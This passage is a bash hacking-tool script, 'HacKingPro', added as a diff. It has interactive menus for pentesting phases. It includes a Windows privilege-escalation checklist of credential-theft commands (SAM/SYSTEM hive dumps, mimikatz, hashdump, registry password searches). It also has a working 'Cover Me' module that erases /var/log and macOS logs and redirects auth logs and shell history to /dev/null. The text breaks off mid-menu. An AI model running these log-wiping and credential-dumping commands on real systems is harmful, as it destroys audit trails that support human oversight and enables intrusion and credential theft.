@@ -1,0 +1,3871 @@
+#!/bin/sh
+#!/bin/bash
+#!/usr/bin/sh
+#!/usr/bin/bash
+#!/usr/bin/env sh
+#!/usr/bin/env bash
+#!/data/data/com.termux/files/usr/bin/sh
+#!/data/data/com.termux/files/usr/bin/bash
+###############################################
+# Name : Anlominus ~ HacKingPro
+# Description : HacKingPro ~ enter your target and Hack Him in the end get Markdown Report.
+# Created Date : 2022 May
+# [ Last UPDATE ] ──╼ [ 13-07-2022 ]
+# Aouther: Anlominus ~> RhytMix ~> HacKingPro
+# Skils: Best Copywriter IN the COSMOS!
+# BIG THANX TO ALL COMUNITY THAT SHARE ALL THAT FREE GREAT SCRIPTS
+# CREDIT: To All World Creators free Scripts & Tools
+# Location: Made With LOVE IN ISRAEL !
+# Source: https://github.com/Anlominus/HacKingPro
+###############################################
+LastUPDATE="2022 July 14"
+ToolSource="https://github.com/AnLoMinus/HacKingPro"
+###############################################
+
+about() {
+  clear
+  # HacKingProLogo1
+  echo "
+    ${ToolHeader}
+
+    ${DGrey}┏──⇢ ${BRed}[${LRed} ${HacKingPro} ${Color_Off}is a Penetration Testing Tool ❕❕❕ ${BRed}]
+    ${DGrey}┣──⇢ ${BRed}[${LRed} ${HacKingPro} ${Color_Off}Written by ${BCyan}Leon Yaakobov ${Color_Off}For Showing Skills ${BRed}]
+    ${DGrey}┗──⇢ ${BRed}[${LRed} ${HacKingPro} ${Color_Off}Tool for ${BRed}Red Teams ${BBlue} Blue Teams ${BRed}]
+
+    ${DGrey}┏==⥤ ${Color_Off}[${LRed} ❌ ❗ Warning ❗ ❌ ${Color_Off}]
+    ${DGrey}|
+    ${DGrey}┣==⥤ ${Color_Off}[${LRed} I’m not responsible for any misuse or damage caused by this program.❗ ${Color_Off}]
+    ${DGrey}|
+    ${DGrey}┗==⥤ ${Color_Off}[${LRed} Use this tool at your own ${BRed}Risk! ❗❗${Color_Off}] "
+
+   read -p "$Press_ENTER"
+}
+
+# Define Colors Variables
+HacKingProColors(){
+##############################################################################
+# COLORS AND BACKGROUNDS
+##############################################################################
+Color_Off='\033[0m' # Text Reset
+
+# Regular Colors
+Black='\033[0;30m'  # Black
+Red='\033[0;31m'    # Red
+Green='\033[0;32m'  # Green
+Yellow='\033[0;33m' # Yellow
+Blue='\033[0;34m'   # Blue
+Purple='\033[0;35m' # Purple
+Cyan='\033[0;36m'   # Cyan
+White='\033[0;97m'  # White
+
+# Additional colors
+LGrey='\033[0;37m'   # Ligth Gray
+DGrey='\033[0;90m'   # Dark Gray
+LRed='\033[0;91m'    # Ligth Red
+LGreen='\033[0;92m'  # Ligth Green
+LYellow='\033[0;93m' # Ligth Yellow
+LBlue='\033[0;94m'   # Ligth Blue
+LPurple='\033[0;95m' # Light Purple
+LCyan='\033[0;96m'   # Ligth Cyan
+
+
+# Bold
+BBlack='\033[1;30m'  # Black
+BRed='\033[1;31m'    # Red
+BGreen='\033[1;32m'  # Green
+BYellow='\033[1;33m' # Yellow
+BBlue='\033[1;34m'   # Blue
+BPurple='\033[1;35m' # Purple
+BCyan='\033[1;36m'   # Cyan
+BWhite='\033[1;37m'  # White
+
+# Underline
+UBlack='\033[4;30m'  # Black
+URed='\033[4;31m'    # Red
+UGreen='\033[4;32m'  # Green
+UYellow='\033[4;33m' # Yellow
+UBlue='\033[4;34m'   # Blue
+UPurple='\033[4;35m' # Purple
+UCyan='\033[4;36m'   # Cyan
+UWhite='\033[4;37m'  # White
+
+# Background
+On_Black='\033[40m'  # Black
+On_Red='\033[41m'    # Red
+On_Green='\033[42m'  # Green
+On_Yellow='\033[43m' # Yellow
+On_Blue='\033[44m'   # Blue
+On_Purple='\033[45m' # Purple
+On_Cyan='\033[46m'   # Cyan
+On_White='\033[47m'  # White
+}
+HacKingProColors
+
+clear
+chmod +x $0
+chmod +x */*/*/*/*
+
+# Checking Running Direction
+CheckPWD(){
+  # Define Current Direction Variable
+  CheckingDirectory="$(pwd)"
+  # Assign $CheckingDirectory to $MainDirectoriy
+  MainDirectoriy="$CheckingDirectory"
+}
+CheckPWD
+
+###############################################
+# WinPrivEsc
+WinPrivEsc(){
+  ## Privilege escalation
+
+  # Now we start the whole enumeration-process over gain.
+  # This is a checklist. You need to check of every single one, in this order.
+  echo "
+  - OS:
+    - Look for hotfixes
+      - systeminfo:
+      - wmic qfe get Caption,Description,HotFixID,InstalledOn
+      - set
+  - Version:
+  - Architecture:
+  - Current user:
+  - Hotfixes:
+  - Antivirus:
+
+  - Kernel exploits
+  - Cleartext password
+  - Reconfigure service parameters
+  - Inside service
+  - Program running as root
+  - Installed software
+  - Scheduled tasks
+  - Weak passwords
+
+  - Users
+    - hostname
+    - net users
+    - net user user1
+    - accesschk.exe -uwcqv 'Authenticated Users' *
+
+  - LocalGroups
+    - net localgroups
+
+  - netsh firewall show state
+  - netsh firewall show config
+
+  - Set path
+    - set PATH=%PATH%;C:\xampp\php
+
+    ### Cleartext passwords
+
+  - Windows autologin
+    - reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon'
+
+  - VNC
+    - reg query 'HKCU\Software\ORL\WinVNC3\Password'
+
+  - SNMP Parameters
+    - reg query 'HKLM\SYSTEM\Current\ControlSet\Services\SNMP'
+
+  - Putty
+    - reg query 'HKCU\Software\SimonTatham\PuTTY\Sessions'
+
+  - Search for password in registry
+    - reg query HKLM /f password /t REG_SZ /s
+    - reg query HKCU /f password /t REG_SZ /s
+
+  - Installed software
+    - Metasploit
+      - ps
+      - tasklist /SVC
+      - net start
+      - reg query HKEY_LOCAL_MACHINE\SOFTWARE
+      - DRIVERQUERY
+    - Look in:
+      - C:\Program files
+      - C:\Program files (x86)
+    Home directory of the user
+
+  - Interesting files
+    - Meterpreter
+      - search -f *.txt
+      - search -f *.zip
+      - search -f *.doc
+      - search -f *.xls
+      - search -f config*
+      - search -f *.rar
+      - search -f *.docx
+      - search -f *.sql
+    - How to cat files in meterpreter
+      - cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt
+    - Recursive search
+      - dir /s
+
+    - Passwords and hashes
+      - wce32.exe -w
+      - wce64.exe -w
+      - fgdump.exe
+      - reg.exe save hklm\sam c:\sam_backup
+      - reg.exe save hklm\security c:\security_backup
+      - reg.exe save hklm\system c:\system
+      - Meterpreter
+        - hashdump
+        - load mimikatz
+        - msv
+
+  - Browser
+    - Browser start-page:
+    - Browser-history:
+    - Saved passwords:
+
+  "
+
+}
+
+
+###############################################
+# Cover Me Cleaning Logs and more.
+CoverMe(){
+
+  LOGS_FILES=(
+  ~/.zsh_sessions/*
+  /var/log/messages # General message and system related stuff
+  /var/log/auth.log # Authenication logs
+  /var/log/kern.log # Kernel logs
+  /var/log/cron.log # Crond logs
+  /var/log/maillog # Mail server logs
+  /var/log/boot.log # System boot log
+  /var/log/mysqld.log # MySQL database server log file
+  /var/log/qmail # Qmail log directory
+  /var/log/httpd # Apache access and error logs directory
+  /var/log/lighttpd # Lighttpd access and error logs directory
+  /var/log/secure # Authentication log
+  /var/log/utmp # Login records file
+  /var/log/wtmp # Login records file
+  /var/log/yum.log # Yum command log file
+  /var/log/system.log # System Log
+  /var/log/DiagnosticMessages # Mac Analytics Data
+  /Library/Logs # System Application Logs
+  /Library/Logs/DiagnosticReports # System Reports
+  ~/Library/Logs # User Application Logs
+  ~/Library/Logs/DiagnosticReports # User Reports
+  )
+
+  # CoverMyAss Cleaning Logs
+
+    MainMenu () {
+      isRoot () {
+              if [ "$EUID" -ne 0 ]; then
+                      return 1
+              fi
+      }
+
+      disableAuth () {
+        if [ -w /var/log/auth.log ]; then
+          ln /dev/null /var/log/auth.log -sf
+          echo " "
+          echo "[+] Permanently sending /var/log/auth.log to /dev/null"
+          read -p "$Press_ENTER"
+        else
+          echo " "
+          echo "[!] /var/log/auth.log is not writable! Retry using sudo."
+          read -p "$Press_ENTER"
+        fi
+      }
+
+      disableHistory () {
+        ln /dev/null ~/.bash_history -sf
+        echo " "
+        echo "[+] Permanently sending bash_history to /dev/null"
+        read -p "$Press_ENTER"
+
+        if [ -f ~/.zsh_history ]; then
+          ln /dev/null ~/.zsh_history -sf
+          echo " "
+          echo "[+] Permanently sending zsh_history to /dev/null"
+          read -p "$Press_ENTER"
+        fi
+        export HISTFILESIZE=0
+        export HISTSIZE=0
+        echo " "
+        echo "[+] Set HISTFILESIZE & HISTSIZE to 0"
+        echo " "
+        set +o history
+        echo "[+] Disabled history library"
+        echo "Permenently disabled bash log."
+        read -p "$Press_ENTER"
+                  }
+
+      enableAuth () {
+        if [ -w /var/log/auth.log ] && [ -L /var/log/auth.log ]; then
+          rm -rf /var/log/auth.log
+          echo " "
+          echo " " > /var/log/auth.log
+          echo "[+] Disabled sending auth logs to /dev/null"
+          read -p "$Press_ENTER"
+        else
+          echo " "
+          echo "[!] /var/log/auth.log is not writable! Retry using sudo."
+          read -p "$Press_ENTER"
+        fi
+      }
+
+      enableHistory () {
+        if [ -L ~/.bash_history ]; then
+          echo " "
+          rm -rf ~/.bash_history
+          echo "" > ~/.bash_history
+          echo "[+] Disabled sending history to /dev/null"
+        fi
+
+        if [ -L ~/.zsh_history ]; then
+          echo " "
+          rm -rf ~/.zsh_history
+          echo "" > ~/.zsh_history
+          echo "[+] Disabled sending zsh history to /dev/null"
+        fi
+
+        export HISTFILESIZE=" "
+        export HISTSIZE=50000
+        echo "
+      ${BWhite}|
+      ${BWhite}|──${BRed}[${BGreen} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} Restore HISTFILESIZE & HISTSIZE default values. ${BRed}]
+      ${BWhite}|
+      ${BWhite}|
+      ${BWhite}|──${BRed}[${BGreen} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} Enabled history library. ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Permenently enabled bash log. ${BRed}]
+      ${BWhite}|        "
+        echo " "
+        set -o history
+        echo " "
+      }
+
+      clearLogs () {
+        for i in "${LOGS_FILES[@]}"
+        do
+          if [ -f "$i" ]; then
+            if [ -w "$i" ]; then
+              read -p "$Press_ENTER"
+              echo " " > "$i"
+              echo " "
+              echo "        ${BWhite}|
+        ${BWhite}|──${BRed}[${BGreen} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} $i Cleaned. ${BRed}]
+        ${BWhite}|              "
+              read -p "$Press_ENTER"
+            else
+              echo " "
+              echo "
+        ${BWhite}|
+        ${BWhite}|──${BRed}[${BGreen} ! ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} $i Is Not Writable! Retry Using sudo. ${BRed}]
+        ${BWhite}|              "
+
+            fi
+          elif [ -d "$i" ]; then
+            if [ -w "$i" ]; then
+              rm -rf "${i:?}"/*
+              echo " "
+              echo "
+        ${BWhite}|
+        ${BWhite}|──${BRed}[${BGreen} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} $i Cleaned. ${BRed}]
+        ${BWhite}|              "
+              read -p "$Press_ENTER"
+            else
+              echo "
+        ${BWhite}|
+        ${BWhite}|──${BRed}[${BGreen} !! ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} $i Is Not Writable! Retry Using sudo. ${BRed}]
+        ${BWhite}|              "
+            fi
+          fi
+        done
+      }
+
+      clearHistory () {
+        if [ -f ~/.zsh_history ]; then
+          echo " "
+          echo " " > ~/.zsh_history
+          echo "
+        ${BWhite}|
+        ${BWhite}|──${BRed}[${DGrey} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} ~/.zsh_history Cleaned. ${BRed}]
+        ${BWhite}|          "
+          read -p "$Press_ENTER"
+        fi
+        echo " "
+        echo " " > ~/.bash_history
+        echo "
+        ${BWhite}|
+        ${BWhite}|──${BRed}[${DGrey} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} ~/.bash_history Cleaned. ${BRed}]
+        ${BWhite}|        "
+        read -p "$Press_ENTER"
+
+        echo " "
+        history -c
+        read -p "$Press_ENTER"
+        echo "
+        ${BWhite}|
+        ${BWhite}|──${BRed}[${DGrey} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen}  History File Deleted. ${BRed}]
+        ${BWhite}|        "
+
+        echo " "
+        echo "
+        ${BWhite}|
+        ${BWhite}|──${BRed}[${BYellow} Reminder ${BRed}]${BWhite}──╼ ${BRed}[${BYellow} your need to reload the session to see effects. Type exit to do so.${BRed}]
+        ${BWhite}|        "
+        read -p "$Press_ENTER"
+      }
+
+      exitTool () {
+              exit 1
+      }
+
+      clear # Clear output
+
+      while true; do
+        #statements
+        clear
+        # HacKingProLogo1
+        HacKingProTargetStatus=$(echo "
+    ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
+
+            ")
+
+    HacKingProMenuMain=$(echo "${BRed}"
+    echo "$HacKingProTargetStatus""
+    ${DGrey}┌──${BRed}[${BYellow} Cover Me ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} 01 ${BRed}]${BGreen}── ${BRed}[${DGrey} Clear logs for user ${BRed}$USER ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 02 ${BRed}]${BGreen}── ${BRed}[${DGrey} Permenently disable auth & bash history ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 03 ${BRed}]${BGreen}── ${BRed}[${DGrey} Restore settings to default ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
+
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}|
+    ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Anonimity ${BRed}]${BGreen}──╼  ${BRed}[${BGreen} Cover Me ${BRed}]${BGreen}──╼ ${BGreen}   ")
+            read -p "$HacKingProMenuMain" cmd
+            case $cmd in
+              1|01 )
+              echo " "
+              clearLogs
+              clearHistory
+              ;;
+              2|02 )
+              echo " "
+              disableAuth
+              disableHistory
+              ;;
+              3|03 )
+              echo " "
+              enableAuth
+              enableHistory
+              ;;
+              lockheed|Lockheed )
+              Lockheed
+              ;;
+              x|X|exit|quit|Exit )
+              clear
+              HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+              echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+              break
+              ;;
+            esac
+          done
+        }
+
+    clear # Clear output
+
+    # "now" option
+    if [ -n "$1" ] && [ "$1" == 'now' ]; then
+            clearLogs
+            clearHistory
+            exit 0
+    fi
+
+    MainMenu
+
+    if [ $option == 1 ]; then
+            # Clear logs & current history
+            clearLogs
+            clearHistory
+    elif [ $option == 2 ]; then
+            # Permenently disable auth & bash log
+            disableAuth
+            disableHistory
+    elif [ $option == 3 ]; then
+            # Restore default settings
+            enableAuth
+            enableHistory
+    elif [ $option == 99 ]; then
+            # Exit tool
+            exitTool
+    else
+            echo "[!] Option not reconized. Exiting."
+    fi
+}
+
+# Lockheed Martin Menu
+Lockheed() {
+  while true; do
+    #statements
+    clear
+    # HacKingProLogo1
+    HacKingProMenuMain=$(echo "
+
+    ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
+
+
+    ${DGrey}┌─────────${BRed}[${BYellow} Lockheed ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 1 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Reconnaissance ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 2 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Weaponization ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 3 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Delivery ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 4 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Exploitation ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 5 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Installation ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 6 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command and Control ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 7 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Actions on Objective ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} X ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Exit / Quit / Close ${BRed}]
+
+
+    ${BBlue}┌──${BBlue}[${BRed} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BBlue}|
+    ${DGrey}|──[ ~$(pwd) ]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} LockHeed ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ")
+
+  read -p "$HacKingProMenuMain" cmd
+  case $cmd in
+    ls )
+    ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${HacKingPro}")"
+    echo "$ls_lahs"
+    sleep 2
+    ls -lahs
+    sleep 2
+    read -p "$ls_lahs" cmd
+    ;;
+    arsenal|Arsenal|cs|CS|cheats|Cheatsheets|CheatSheets|Commands|commands|zz )
+    Arsenal
+    ;;
+    p|P )
+    HacKingProPlanning
+    ;;
+    x|X|exit|EXIT )
+    cd $XHacKingPro
+    clear
+    break
+    ;;
+    2 )
+    while true; do
+      #statements
+      clear
+      # HacKingProLogo1
+    HacKingProMenuMain=$(echo "
+
+    ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
+
+
+    ${DGrey}┌─────────${BRed}[${BYellow} Lockheed ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} Weaponization ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 1 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Viruses ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 2 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Ransomware ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 3 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Worms ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 4 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Trojans ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 5 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Rootkits ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 6 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Keyloggers ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 7 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Logic bombs ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 8 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Adware ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 9 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Spyware ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 10 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Bots ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} X ${BRed}]${BGreen} ╼ ${BRed}[${DGrey} Exit / Quit / Close ${BRed}]
+
+
+    ${BBlue}┌──${BBlue}[${BRed} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BBlue}|
+    ${DGrey}|──[ ~$(pwd) ]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} LockHeed ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ")
+
+    read -p "$HacKingProMenuMain" cmd
+    case $cmd in
+      ls )
+      ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${HacKingPro}")"
+      echo "$ls_lahs"
+      sleep 2
+      ls -lahs
+      sleep 2
+      read -p "$ls_lahs" cmd
+      ;;
+      arsenal|Arsenal|cs|CS|cheats|Cheatsheets|CheatSheets|Commands|commands|zz )
+      Arsenal
+      ;;
+      p|P )
+      HacKingProPlanning
+      ;;
+      x|X|exit|EXIT )
+      cd $XHacKingPro
+      clear
+      break
+      ;;
+    esac
+  done
+    ;;
+  esac
+done
+}
+
+# HackTricks Menu
+HackTricks(){
+while true; do
+  #statements
+  cd $xMenu01_CSI
+  clear
+  # HacKingProLogo1
+  HacKingProMenuMain=$(echo "${BRed}
+    ${ToolHeader}
+
+    ${DGrey}⤝${BRed}[${DGrey} https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-methodology ${BRed}]${DGrey}⤞
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
+
+    ${DGrey}┌────╼ ${BRed}[${DGrey} HackTricks ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Pentesting Methodology ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} 00 ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} Physical Attacks ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 01 ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} Discovering hosts inside the network / Discovering Assets of the company ${BRed}]
